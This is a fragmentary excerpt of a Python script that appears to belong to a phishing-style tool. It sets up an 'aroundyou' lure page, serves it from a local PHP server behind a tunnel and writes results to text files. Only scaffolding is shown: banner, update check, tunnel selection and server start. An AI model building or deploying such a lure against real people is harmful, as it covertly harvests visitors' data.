...
result = 'template/aroundyou/php/result.txt'
info = 'template/aroundyou/php/info.txt'
site = 'aroundyou'
row = []
version = '1.1.8'
...
(______/|_|   |_|\_____/|_|     |_|      
                                    ''' + W)
	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'MAdhav Gaur')
	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')

def ver_check():
	print(G + '[+]' + C + ' Checking for Updates.....', end='')
	ver_url = 'https://raw.githubusercontent.com/shivgori/Snuff/snuff/master/version.txt'
...
def tunnel_select():
	if tunnel_mode == 'default':
		...
		print(G + '[+]' + C + ' Append ' + W + '/aroundyou/' + C + ' to tunnel URL...' + W)
	else:
...
def server():
	...
	with open('logs/php.log', 'w') as phplog:
		...
		time.sleep(3)
	try:
		php_rqst = requests.get('http://127.0.0.1:8080/aroundyou/index.html')
